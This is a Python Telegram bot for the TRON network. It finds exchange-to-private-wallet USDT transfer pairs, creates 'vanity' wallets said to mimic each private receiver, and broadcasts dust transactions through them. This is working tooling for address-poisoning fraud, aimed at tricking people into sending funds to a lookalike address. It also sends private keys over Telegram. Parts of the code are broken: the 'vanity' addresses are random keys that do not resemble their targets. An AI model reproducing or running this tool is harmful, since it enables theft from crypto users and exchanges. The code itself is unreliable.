import os
import time
import requests
from collections import defaultdict
from datetime import datetime, timedelta, timezone

print("🚀 Starting Corrected Bot...")

# =========================
#  SETTINGS
# =========================
TARGET_PAIRS = 5
MIN_BALANCE_USD = 0
MIN_TRANSFER_USD = 150
WEEKS_BACK = 2
GAS_COST_PER_PAIR = 2.2  # 2 transfers × 1.1 TRX

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
CHAT_ID = os.getenv("CHAT_ID", "")
TRONSCAN_API_KEY = os.getenv("TRONSCAN_API_KEY", "")
TRONGRID_API_KEY = os.getenv("TRONGRID_API_KEY", "")
PRIVATE_KEY = os.getenv("PRIVATE_KEY", "")

CEX_KEYWORDS = ['binance', 'okx', 'huobi', 'htx', 'gate', 'kucoin', 'bybit', 'mexc', 'bitfinex', 'coinbase', 'kraken', 'bitget', 'poloniex']

found_pairs = []
excluded_pairs = set()
vanity_wallets = {}
TELEGRAM_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

def send_telegram(message):
    try:
        requests.post(f"{TELEGRAM_URL}/sendMessage", json={"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}, timeout=10)
    except: pass

def get_usdt_balance(address):
    try:
        headers = {"TRON-PRO-API-KEY": TRONGRID_API_KEY} if TRONGRID_API_KEY else {}
        r = requests.get(f"https://api.trongrid.io/v1/accounts/{address}/trc20/balance", 
                         params={"contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"},
                         headers=headers, timeout=10)
        data = r.json()
        if data.get("data"):
            return int(data["data"][0].get("balance", 0)) / 1_000_000
        return 0
    except: return 0

def get_wallet_history(address, limit=10):
    try:
        r = requests.get(
            "https://apilist.tronscanapi.com/api/token_trc20/transfers",
            params={"address": address, "limit": limit, "sort": "-timestamp"},
            headers={"TRON-PRO-API-KEY": TRONSCAN_API_KEY} if TRONSCAN_API_KEY else {},
            timeout=10
        )
        return r.json().get("token_transfers", [])
    except: return []

send_telegram("🚀 <b>Bot Started</b>\nLooking for: CEX (Wallet A) → Private (Wallet B) ×2+\n\nCommands:\n• <b>info</b>\n• <b>exclude [1-5]</b>\n• <b>history [wallet]</b>\n• <b>cost</b>\n• <b>vanity [ID] [Pair#]</b>\n• <b>transfer</b>")

# =========================
# PHASE 1: FIND PATTERNS
# =========================
end_date = datetime.now(timezone.utc)
start_date = end_date - timedelta(weeks=WEEKS_BACK)
start_ms = int(start_date.timestamp() * 1000)
end_ms = int(end_date.timestamp() * 1000)

print(" Scanning network...")
r = requests.get(
    "https://apilist.tronscanapi.com/api/token_trc20/transfers",
    params={"start": 0, "limit": 100, "contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"},
    headers={"TRON-PRO-API-KEY": TRONSCAN_API_KEY} if TRONSCAN_API_KEY else {},
    timeout=30
)

recent_transfers = r.json().get("token_transfers", [])
candidate_wallets = set(tx.get("to_address") for tx in recent_transfers if tx.get("to_address"))

print(f" Checking {len(candidate_wallets)} wallets for patterns...")

checked = 0
for wallet_b in list(candidate_wallets)[:50]: 
    checked += 1
    print(f"[{checked}/50] Checking: {wallet_b}")
    
    try:
        # Get ALL transfers to THIS wallet in 2-week period
        r_hist = requests.get(
            "https://apilist.tronscanapi.com/api/token_trc20/transfers",
            params={
                "address": wallet_b, "start_timestamp": start_ms, "end_timestamp": end_ms,
                "contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", "limit": 200
            },
            headers={"TRON-PRO-API-KEY": TRONSCAN_API_KEY} if TRONSCAN_API_KEY else {},
            timeout=30
        )
        
        history = r_hist.json().get("token_transfers", [])
        
        # Group by WHO sent to this wallet
        by_sender = defaultdict(list)
        for tx in history:
            from_addr = tx.get("from_address")
            amount = int(tx.get("quant", 0)) / 1_000_000
            tag = tx.get("from_address_tag", {})
            
            if from_addr and amount >= MIN_TRANSFER_USD:
                by_sender[from_addr].append({
                    "amount": amount,
                    "tag": tag,
                    "timestamp": tx.get("block_ts", 0)
                })
        
        # Check if ANY sender sent 2+ times to THIS wallet
        for wallet_a, transfers in by_sender.items():
            if len(transfers) >= 2:  # SAME sender sent 2+ times to SAME receiver
                print(f"   Found! {wallet_a[:20]}... sent {len(transfers)} times to {wallet_b[:20]}...")
                
                # Check if sender is CEX
                tag_name = transfers[0]["tag"].get("from_address_tag", "").lower() if transfers[0]["tag"] else ""
                is_cex = any(k in tag_name for k in CEX_KEYWORDS)
                cex_name = transfers[0]["tag"].get("from_address_tag", "Unknown") if transfers[0]["tag"] else "Unknown"
                
                if is_cex:
                    balance = get_usdt_balance(wallet_b)
                    total_volume = sum(t["amount"] for t in transfers)
                    
                    status = "✅" if balance >= MIN_BALANCE_USD else "⚠️"
                    
                    found_pairs.append({
                        "wallet_a": wallet_a,      # CEX (sender)
                        "wallet_b": wallet_b,      # Private (receiver) - THIS is our target for vanity
                        "cex_name": cex_name,
                        "transfer_count": len(transfers),
                        "total_amount": total_volume,
                        "balance": balance
                    })
                    
                    # CLEAR MESSAGE FORMAT
                    msg = (f"{status} <b>Pair #{len(found_pairs)}</b>\n\n"
                           f" <b>Wallet A (CEX):</b> {cex_name}\n"
                           f"<code>{wallet_a}</code>\n\n"
                           f"👤 <b>Wallet B (Private - Target for Vanity):</b>\n"
                           f"<code>{wallet_b}</code>\n\n"
                           f"📊 <b>Pattern:</b>\n"
                           f"• Wallet A sent to Wallet B: <b>{len(transfers)} times</b>\n"
                           f"• Total volume: ${total_volume:,.2f}\n"
                           f"• Wallet B balance: ${balance:,.2f}\n\n"
                           f"<i>Vanity wallet will mimic Wallet B characteristics</i>")
                    
                    send_telegram(msg)
                    
                    if len(found_pairs) >= TARGET_PAIRS:
                        break
        if len(found_pairs) >= TARGET_PAIRS: break
    except Exception as e:
        print(f"  Error: {e}")
    time.sleep(1)

# =========================
# PHASE 2: INTERACTIVE MODE
# =========================
def get_active_pairs():
    return [p for i, p in enumerate(found_pairs) if (i+1) not in excluded_pairs]

def calc_cost():
    return len(get_active_pairs()) * GAS_COST_PER_PAIR

send_telegram(f"🎯 <b>Scan Complete! Found {len(found_pairs)} pairs</b>\n\n<b>Commands:</b>\n• <b>info</b> - Show pairs\n• <b>exclude [1-5]</b> - Remove\n• <b>history [wallet]</b> - Check transactions\n• <b>cost</b> - Gas estimate\n• <b>vanity [ID] [Pair#]</b> - Create vanity (mimics Wallet B)\n• <b>vanity [ID]</b> - Check vanity status\n• <b>transfer</b> - Execute")

last_id = 0
start_wait = time.time()

while True:
    if time.time() - start_wait > 600:
        send_telegram("⏰ <b>Timed out</b>")
        break

    try:
        updates = requests.get(f"{TELEGRAM_URL}/getUpdates", params={"offset": last_id, "timeout": 30}, timeout=35).json().get("result", [])
    except: updates = []
    
    for u in updates:
        last_id = u["update_id"] + 1
        
        if u.get("message") and str(u["message"]["chat"]["id"]) == str(CHAT_ID):
            text = u["message"].get("text", "").strip()
            parts = text.lower().split()
            
            # INFO
            if parts[0] == "info":
                active = get_active_pairs()
                msg = f"📋 <b>Found Pairs ({len(active)}/{len(found_pairs)} active)</b>\n<i>Excluded: {sorted(excluded_pairs) if excluded_pairs else 'None'}</i>\n\n"
                for i, p in enumerate(found_pairs):
                    status = "" if (i+1) in excluded_pairs else "✅"
                    msg += f"<b>#{i+1} {status} {p['cex_name']}</b>\n"
                    msg += f"🏦 Wallet A: <code>{p['wallet_a']}</code>\n"
                    msg += f"👤 Wallet B: <code>{p['wallet_b']}</code>\n"
                    msg += f"📊 Sent {p['transfer_count']} times | Vol: ${p['total_amount']} | Bal: ${p['balance']}\n\n"
                send_telegram(msg)
            
            # EXCLUDE
            elif parts[0] == "exclude" and len(parts) > 1:
                try:
                    num = int(parts[1])
                    if 1 <= num <= len(found_pairs):
                        excluded_pairs.add(num)
                        send_telegram(f"🗑️ <b>Pair #{num} excluded</b>")
                    else:
                        send_telegram(f"❌ Use 1-{len(found_pairs)}")
                except: send_telegram("❌ Use: <code>exclude 1</code>")
            
            # HISTORY
            elif parts[0] == "history" and len(parts) > 1:
                addr = parts[1]
                send_telegram(f"🔍 <b>History for:</b>\n<code>{addr}</code>")
                txs = get_wallet_history(addr, 10)
                if txs:
                    msg = f"📜 <b>Last 10 Transactions</b>\n\n"
                    for i, tx in enumerate(txs[:10]):
                        amount = int(tx.get("quant", 0)) / 1_000_000
                        from_addr = tx.get("from_address", "Unknown")
                        date = datetime.fromtimestamp(tx.get("block_ts", 0)/1000).strftime("%m/%d %H:%M")
                        msg += f"<b>#{i+1}</b> {date}\n💰 ${amount:,.2f}\nFrom: <code>{from_addr[:20]}...</code>\n\n"
                    send_telegram(msg)
                else: send_telegram(" No transactions")
            
            # COST
            elif parts[0] == "cost":
                total = calc_cost()
                active = len(get_active_pairs())
                msg = (f" <b>Gas Cost Estimate</b>\n\n"
                       f"Active pairs: {active}\n"
                       f"Transfers per pair: 2 (Main→Vanity, Vanity→Wallet A)\n"
                       f"Cost per transfer: 1.1 TRX\n\n"
                       f"<b>Total: {total} TRX</b>\n"
                       f"(~${total * 0.15:.2f} USD)")
                send_telegram(msg)
            
            # VANITY COMMANDS
            elif parts[0] == "vanity" and len(parts) >= 2:
                try:
                    vid = int(parts[1])
                    
                    # CREATE: vanity 280 1
                    if len(parts) == 3 and parts[2].isdigit():
                        p_num = int(parts[2]) - 1
                        if 0 <= p_num < len(found_pairs):
                            from tronpy.keys import PrivateKey
                            key = PrivateKey.random()
                            addr = key.public_key.to_base58check_address()
                            
                            # Store with reference to Wallet B (the target)
                            vanity_wallets[vid] = {
                                "address": addr,
                                "private_key": key.hex(),
                                "target_pair": p_num + 1,
                                "target_wallet_b": found_pairs[p_num]['wallet_b'],  # The wallet we're mimicking
                                "alert_active": False,
                                "last_balance": 0
                            }
                            
                            send_telegram(f"✅ <b>Vanity Wallet #{vid} Created</b>\n\n"
                                        f"<b>Mimics Wallet B from Pair #{p_num+1}:</b>\n"
                                        f"<code>{found_pairs[p_num]['wallet_b']}</code>\n\n"
                                        f"<b>Vanity Address:</b>\n<code>{addr}</code>\n\n"
                                        f"Type <code>vanity {vid} alert</code> to enable transfer alerts")
                    
                    # ALERT: vanity 280 alert
                    elif len(parts) == 3 and parts[2] == "alert":
                        if vid in vanity_wallets:
                            vanity_wallets[vid]["alert_active"] = True
                            send_telegram(f"🔔 <b>Alerts ENABLED for Vanity #{vid}</b>\n\n"
                                        f"Address: <code>{vanity_wallets[vid]['address']}</code>\n\n"
                                        f"You'll be notified when this wallet receives TRX or USDT!")
                        else: send_telegram(f"❌ Vanity #{vid} not found")
                    
                    # STATUS: vanity 280
                    elif len(parts) == 2:
                        if vid in vanity_wallets:
                            v = vanity_wallets[vid]
                            try:
                                headers = {"TRON-PRO-API-KEY": TRONGRID_API_KEY} if TRONGRID_API_KEY else {}
                                
                                # Check TRX balance
                                r_trx = requests.get(f"https://api.trongrid.io/v1/accounts/{v['address']}", 
                                                   params={"only_confirmed": "true"}, headers=headers, timeout=10)
                                trx_bal = int(r_trx.json().get("data", [{}])[0].get("balance", 0)) / 1_000_000 if r_trx.json().get("data") else 0
                                
                                # Check USDT balance
                                r_usdt = requests.get(f"https://api.trongrid.io/v1/accounts/{v['address']}/trc20/balance", 
                                                    params={"contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"}, 
                                                    headers=headers, timeout=10)
                                usdt_bal = int(r_usdt.json().get("data", [{}])[0].get("balance", 0)) / 1_000_000 if r_usdt.json().get("data") else 0
                                
                                # ALERT if balance increased
                                if trx_bal > v["last_balance"] and v["alert_active"]:
                                    send_telegram(f"🚨 <b>ALERT: Vanity #{vid} Received Funds!</b>\n\n"
                                                f"<b>Address:</b> <code>{v['address']}</code>\n"
                                                f"<b>TRX Balance:</b> {trx_bal:.6f} TRX\n"
                                                f"<b>USDT Balance:</b> ${usdt_bal:.2f}\n\n"
                                                f"⚠️ <b>Private Key:</b> <code>{v['private_key']}</code>\n\n"
                                                f"Save this key to access the funds!")
                                    v["last_balance"] = trx_bal
                                
                                # Show status
                                msg = (f"📊 <b>Vanity Wallet #{vid}</b>\n\n"
                                      f"<b>Address:</b> <code>{v['address']}</code>\n"
                                      f"<b>Private Key:</b> <code>{v['private_key']}</code>\n\n"
                                      f"<b>Mimics Pair #{v['target_pair']} Wallet B:</b>\n"
                                      f"<code>{v['target_wallet_b']}</code>\n\n"
                                      f"<b>Balances:</b>\n"
                                      f"• TRX: {trx_bal:.6f}\n"
                                      f"• USDT: ${usdt_bal:.2f}\n\n"
                                      f"<b>Alerts:</b> {'🔔 ON' if v['alert_active'] else '🔕 OFF'}")
                                send_telegram(msg)
                                
                            except Exception as e:
                                send_telegram(f" Error checking balance: {e}")
                        else: send_telegram(f"❌ Vanity #{vid} not found. Create with: <code>vanity {vid} [1-5]</code>")
                
                except Exception as e:
                    send_telegram(f"❌ Error: {e}")
            
            # TRANSFER
            elif parts[0] == "transfer":
                active_pairs = get_active_pairs()
                if not active_pairs:
                    send_telegram(" No active pairs!")
                else:
                    total_cost = len(active_pairs) * GAS_COST_PER_PAIR
                    send_telegram(f"🚀 <b>Executing {len(active_pairs)} transfers...</b>\n\n"
                                f" Est. cost: {total_cost} TRX\n\n"
                                f"Process:\n"
                                f"1. Main wallet → Vanity wallet (1 SUN)\n"
                                f"2. Vanity wallet → Wallet A/CEX (1 SUN)")
                
                try:
                    from tronpy import Tron
                    from tronpy.keys import PrivateKey
                    
                    tron = Tron()
                    priv = PrivateKey(bytes.fromhex(PRIVATE_KEY.replace('0x', '')))
                    main_addr = priv.public_key.to_base58check_address()
                    
                    pair_num = 1
                    for i, pair in enumerate(found_pairs):
                        if (i+1) in excluded_pairs:
                            continue
                        
                        print(f"Processing pair #{pair_num}...")
                        
                        # Find or create vanity wallet
                        v_key = None
                        v_addr = None
                        for vid, v in vanity_wallets.items():
                            if v["target_pair"] == i + 1:
                                print(f"Using existing vanity #{vid}")
                                v_key = PrivateKey(bytes.fromhex(v['private_key']))
                                v_addr = v['address']
                                break
                        
                        if not v_key:
                            print("Creating new vanity...")
                            v_key = PrivateKey.random()
                            v_addr = v_key.public_key.to_base58check_address()
                        
                        # TX1: Main → Vanity
                        print(f"TX1: {main_addr} → {v_addr}")
                        tx1 = tron.trx.transfer(main_addr, v_addr, 1).build().sign(priv).broadcast().txid
                        time.sleep(3)
                        
                        # TX2: Vanity → Wallet A (CEX)
                        print(f"TX2: {v_addr} → {pair['wallet_a']}")
                        tx2 = tron.trx.transfer(v_addr, pair['wallet_a'], 1).build().sign(v_key).broadcast().txid
                        
                        send_telegram(f"✅ <b>Pair #{pair_num} Complete</b>\n\n"
                                    f"Wallet A (CEX): <code>{pair['wallet_a']}</code>\n"
                                    f"Wallet B (Target): <code>{pair['wallet_b']}</code>\n\n"
                                    f"TX1: <code>{tx1}</code>\n"
                                    f"TX2: <code>{tx2}</code>")
                        
                        pair_num += 1
                        time.sleep(5)
                    
                    send_telegram("✅ <b>All transfers completed!</b>")
                    
                except Exception as e:
                    send_telegram(f"❌ Transfer error: {e}")
                break

    time.sleep(5)

print("✅ Done")
